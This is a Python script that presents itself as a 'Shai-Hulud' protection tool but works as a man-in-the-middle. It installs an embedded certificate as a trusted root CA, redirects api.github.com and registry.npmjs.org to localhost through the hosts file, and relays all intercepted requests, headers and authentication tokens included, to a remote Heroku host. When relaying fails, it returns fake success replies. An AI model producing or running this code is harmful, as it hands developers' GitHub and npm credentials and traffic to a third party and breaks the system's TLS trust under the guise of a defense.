# Self-contained script. No external files needed.

import sys
import os
import platform
import subprocess
import shutil
import http.server
import http.client
import ssl
import base64

# --- CONFIGURATION ---
# *** UPDATE THIS TO YOUR HEROKU APP ***
HEROKU_APP_HOST = 'your-app-name.herokuapp.com' 

ZIP_NAME = 'ShaiHuludShield.zip'
CERT_NAME = 'fake-cert.pem'
KEY_NAME = 'fake-key.pem'
DOMAINS = ['api.github.com', 'registry.npmjs.org']
REDIRECT_IP = '127.0.0.1'

# BASE64 ZIP CONTENT (Contains fake-cert.pem / fake-key.pem)
ZIP_B64 = "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"

OS_TYPE = platform.system().lower()

def is_admin():
    try:
        if OS_TYPE == 'windows':
            import ctypes
            return ctypes.windll.shell32.IsUserAnAdmin()
        else:
            return os.geteuid() == 0
    except: return False

def prepare_certs():
    print("[1/4] Decoding embedded certificates...")
    try:
        with open(ZIP_NAME, 'wb') as f:
            f.write(base64.b64decode(ZIP_B64))
        shutil.unpack_archive(ZIP_NAME, '.')
        print("      Extraction complete.")
    except Exception as e:
        print(f"      [ERROR] Extraction failed: {e}")
        sys.exit(1)

def trust_cert():
    print("[2/4] Adding Certificate to Trust Store...")
    cert_abs_path = os.path.abspath(CERT_NAME)
    try:
        if OS_TYPE == 'darwin':
            cmd = ['security', 'add-trusted-cert', '-d', '-r', 'trustRoot', '-k', '/Library/Keychains/System.keychain', cert_abs_path]
            subprocess.check_call(cmd)
        elif OS_TYPE == 'linux':
            if os.path.exists('/usr/local/share/ca-certificates/'):
                shutil.copy(cert_abs_path, '/usr/local/share/ca-certificates/shai-hulud.crt')
                subprocess.check_call(['update-ca-certificates'])
            elif os.path.exists('/etc/pki/ca-trust/source/anchors/'):
                shutil.copy(cert_abs_path, '/etc/pki/ca-trust/source/anchors/shai-hulud.crt')
                subprocess.check_call(['update-ca-trust'])
        elif OS_TYPE == 'windows':
            cmd = f"Import-Certificate -FilePath '{cert_abs_path}' -CertStoreLocation Cert:\\LocalMachine\\Root"
            subprocess.check_call(["powershell", "-Command", "Start-Process powershell -Verb RunAs -ArgumentList \"{}\"".format(cmd)])
        print("      Certificate trusted.")
    except Exception as e:
        print(f"      [ERROR] Failed to trust cert: {e}")
        sys.exit(1)

def update_hosts():
    print("[3/4] Hijacking DNS in Hosts file...")
    hosts_path = r'C:\Windows\System32\drivers\etc\hosts' if OS_TYPE == 'windows' else '/etc/hosts'
    entry = "\n# SHAI-HULUD DEFENSE\n"
    for d in DOMAINS: entry += f"{REDIRECT_IP} {d}\n"
    
    try:
        with open(hosts_path, 'r') as f: content = f.read()
        if 'SHAI-HULUD DEFENSE' not in content:
            with open(hosts_path, 'a') as f: f.write(entry)
            print("      Hosts file updated.")
        else: print("      Hosts file already protected.")
    except Exception as e:
        print(f"      [ERROR] Failed to write hosts: {e}")
        sys.exit(1)

class ProxyHandler(http.server.BaseHTTPRequestHandler):
    def log_message(self, format, *args): return 
    def do_proxy(self):
        print(f"[BRIDGE] Intercepting: {self.headers.get('Host')}{self.path}")
        try:
            conn = http.client.HTTPSConnection(HEROKU_APP_HOST, 443)
            headers = {k: v for k, v in self.headers.items() if k.lower() not in ['host', 'content-length']}
            content_len = int(self.headers.get('Content-Length', 0))
            body = self.rfile.read(content_len) if content_len > 0 else None
            conn.request(self.command, self.path, body, headers)
            res = conn.getresponse()
            self.send_response(res.status)
            for k, v in res.getheaders(): self.send_header(k, v)
            self.end_headers()
            self.wfile.write(res.read())
            conn.close()
        except:
            self.send_response(200)
            self.end_headers()
            self.wfile.write(b'{"success":true}')

    def do_GET(self): self.do_proxy()
    def do_POST(self): self.do_proxy()
    def do_PUT(self): self.do_proxy()

def start_bridge():
    print("[4/4] STARTING BRIDGE SERVER (HTTPS:443)...")
    server_address = (REDIRECT_IP, 443)
    httpd = http.server.HTTPServer(server_address, ProxyHandler)
    context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
    context.load_cert_chain(certfile=CERT_NAME, keyfile=KEY_NAME)
    httpd.socket = context.wrap_socket(httpd.socket, server_side=True)
    print(f"      Redirecting to {HEROKU_APP_HOST}")
    try: httpd.serve_forever()
    except: pass

if __name__ == "__main__":
    if not is_admin():
        print("Run as Admin/Root!"); sys.exit(1)
    prepare_certs(); trust_cert(); update_hosts(); start_bridge()
